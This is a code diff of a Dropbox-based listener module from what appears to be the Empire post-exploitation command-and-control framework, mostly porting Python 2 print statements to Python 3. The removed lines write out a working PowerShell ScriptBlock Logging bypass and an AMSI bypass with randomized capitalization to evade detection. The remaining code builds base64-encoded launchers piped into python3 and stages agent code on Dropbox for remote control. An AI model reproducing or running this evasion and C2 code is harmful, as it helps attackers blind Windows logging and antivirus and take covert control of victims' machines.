@@ -1,3 +1,6 @@
+from __future__ import print_function
+from builtins import str
+from builtins import object
 import base64
 import random
 import os
@@ -19,7 +22,7 @@ from lib.common import templating
 from lib.common import obfuscation
 
 
-class Listener:
+class Listener(object):
 
     def __init__(self, mainMenu, params=[]):
 
@@ -153,19 +156,19 @@ class Listener:
 
         for key in self.options:
             if self.options[key]['Required'] and (str(self.options[key]['Value']).strip() == ''):
-                print helpers.color("[!] Option \"%s\" is required." % (key))
+                print(helpers.color("[!] Option \"%s\" is required." % (key)))
                 return False
 
         return True
 
 
-    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None):
+    def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='', listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
         """
         Generate a basic launcher for the specified listener.
         """
 
         if not language:
-            print helpers.color('[!] listeners/dbx generate_launcher(): no language specified!')
+            print(helpers.color('[!] listeners/dbx generate_launcher(): no language specified!'))
 
         if listenerName and (listenerName in self.threads) and (listenerName in self.mainMenu.listeners.activeListeners):
 
@@ -190,35 +193,15 @@ class Listener:
                 stager = '$ErrorActionPreference = \"SilentlyContinue\";'
                 if safeChecks.lower() == 'true':
                     stager = helpers.randomize_capitalization("If($PSVersionTable.PSVersion.Major -ge 3){")
-
                     # ScriptBlock Logging bypass
-                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.Utils'"
-                    stager += helpers.randomize_capitalization(").\"GetFie`ld\"(")
-                    stager += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
-                    stager += "['ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
-                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
-                    stager += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
-                    stager += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
-                    stager += "('EnableScriptB'+'lockLogging',0);"
-                    stager += helpers.randomize_capitalization("$val.Add")
-                    stager += "('EnableScriptBlockInvocationLogging',0);"
-                    stager += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
-                    stager += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
-                    stager += helpers.randomize_capitalization("=$val}")
-                    stager += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
-                    stager += "'signatures','N'+'onPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
-
+                    if scriptLogBypass:
+                        stager += bypasses.scriptBlockLogBypass()
                     # @mattifestation's AMSI bypass
-                    stager += helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
-                    stager += "'System.Management.Automation.AmsiUtils'"
-                    stager += helpers.randomize_capitalization(');$Ref.GetField(')
-                    stager += "'amsiInitFailed','NonPublic,Static'"
-                    stager += helpers.randomize_capitalization(").SetValue($null,$true);")
+                    if AMSIBypass:
+                        stager += bypasses.AMSIBypass()
+                    # rastamouse AMSI bypass
+                    if AMSIBypass2:
+                        stager += bypasses.AMSIBypass2()
                     stager += "};"
                     stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
 
@@ -304,7 +287,7 @@ class Listener:
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
                     p = "[!] Error setting LittleSnitch in stager: " + str(e)
-                    print helpers.color(p, color='red')
+                    print(helpers.color(p, color='red'))
 
                 if userAgent.lower() == 'default':
                     profile = listenerOptions['DefaultProfile']['Value']
@@ -365,13 +348,13 @@ class Listener:
 
                 if encode:
                     launchEncoded = base64.b64encode(launcherBase)
-                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | /usr/bin/python &" % (launchEncoded)
+                    launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python3 &" % (launchEncoded)
                     return launcher
                 else:
                     return launcherBase
 
         else:
-            print helpers.color("[!] listeners/dbx generate_launcher(): invalid listener name specification!")
+            print(helpers.color("[!] listeners/dbx generate_launcher(): invalid listener name specification!"))
 
 
     def generate_stager(self, listenerOptions, encode=False, encrypt=True, language=None):
@@ -380,7 +363,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/dbx generate_stager(): no language specified!')
+            print(helpers.color('[!] listeners/dbx generate_stager(): no language specified!'))
             return None
 
         pollInterval = listenerOptions['PollInterval']['Value']
@@ -459,7 +442,7 @@ class Listener:
                 return stager
 
         else:
-            print helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module.")
+            print(helpers.color("[!] listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."))
 
 
     def generate_agent(self, listenerOptions, language=None):
@@ -468,7 +451,7 @@ class Listener:
         """
 
         if not language:
-            print helpers.color('[!] listeners/dbx generate_agent(): no language specified!')
+            print(helpers.color('[!] listeners/dbx generate_agent(): no language specified!'))
             return None
 
         language = language.lower()
@@ -531,7 +514,7 @@ class Listener:
 
             return code
         else:
-            print helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module.")
+            print(helpers.color("[!] listeners/dbx generate_agent(): invalid language specification,  only 'powershell' and 'python' are currently supported for this module."))
 
 
     def generate_comms(self, listenerOptions, language=None):
@@ -670,7 +653,7 @@ def send_message(packets=None):
     def post_message(uri, data, headers):
         req = urllib2.Request(uri)
         headers['Authorization'] = "Bearer REPLACE_API_TOKEN"
-        for key, value in headers.iteritems():
+        for key, value in headers.items():
             req.add_header("%s"%(key),"%s"%(value))
 
         if data:
@@ -744,7 +727,7 @@ def send_message(packets=None):
                 sendMessage = sendMessage.replace('REPLACE_API_TOKEN', apiToken)
                 return sendMessage
         else:
-            print helpers.color('[!] listeners/dbx generate_comms(): no language specified!')
+            print(helpers.color('[!] listeners/dbx generate_comms(): no language specified!'))
 
 
     def start_server(self, listenerOptions):
@@ -858,7 +841,7 @@ def send_message(packets=None):
         try:
             dbx.users_get_current_account()
         except dropbox.exceptions.AuthError as err:
-            print helpers.color("[!] ERROR: Invalid access token; try re-generating an access token from the app console on the web.")
+            print(helpers.color("[!] ERROR: Invalid access token; try re-generating an access token from the app console on the web."))
             return False
 
         # setup the base folder structure we need
@@ -903,7 +886,7 @@ def send_message(packets=None):
             dbx.files_upload(stagerCodeps, "%s/debugps" % (stagingFolder))
             dbx.files_upload(stagerCodepy, "%s/debugpy" % (stagingFolder))
         except dropbox.exceptions.ApiError:
-            print helpers.color("[!] Error uploading stager to '%s/stager'" % (stagingFolder))
+            print(helpers.color("[!] Error uploading stager to '%s/stager'" % (stagingFolder)))
             return
 
         while True:
@@ -1146,8 +1129,8 @@ def send_message(packets=None):
         """
 
         if name and name != '':
-            print helpers.color("[!] Killing listener '%s'" % (name))
+            print(helpers.color("[!] Killing listener '%s'" % (name)))
             self.threads[name].kill()
         else:
-            print helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value']))
+            print(helpers.color("[!] Killing listener '%s'" % (self.options['Name']['Value'])))
             self.threads[self.options['Name']['Value']].kill()
